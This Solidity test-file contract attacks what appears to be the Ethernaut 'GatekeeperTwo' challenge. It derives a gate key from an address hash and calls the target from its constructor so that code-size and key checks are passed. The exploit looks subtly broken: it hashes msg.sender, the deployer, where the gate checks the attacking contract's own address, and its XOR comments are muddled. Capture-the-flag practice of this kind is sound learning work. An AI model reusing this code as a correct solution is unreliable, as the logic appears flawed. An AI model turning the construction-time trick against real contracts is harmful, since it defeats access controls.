pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
    function check() external;
}

contract GatekeeperTwoAttack {

    IGatekeeperTwo gateKeeperTwo;

    constructor(address addr) {
        console.log('msg.sender deployer', msg.sender);
        gateKeeperTwo = IGatekeeperTwo(addr);
        uint64 _gateKey = ~uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));

        // a ^ a ^ b = b
        // a = 0101
        // c = a ^ a = 0000
        // b = 1001
        // c ^ b = 1001 (see below)
        // 0000
        // 1001
        // 1001

        // s ^ g = m
        // s = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
        // g = uint64(_gatekey)
        // m = uint64(max)
        // s ^ s ^ g = g
        // c = s ^ s = 0...0
        // c ^ g = g
        gateKeeperTwo.enter(bytes8(_gateKey));
    }
}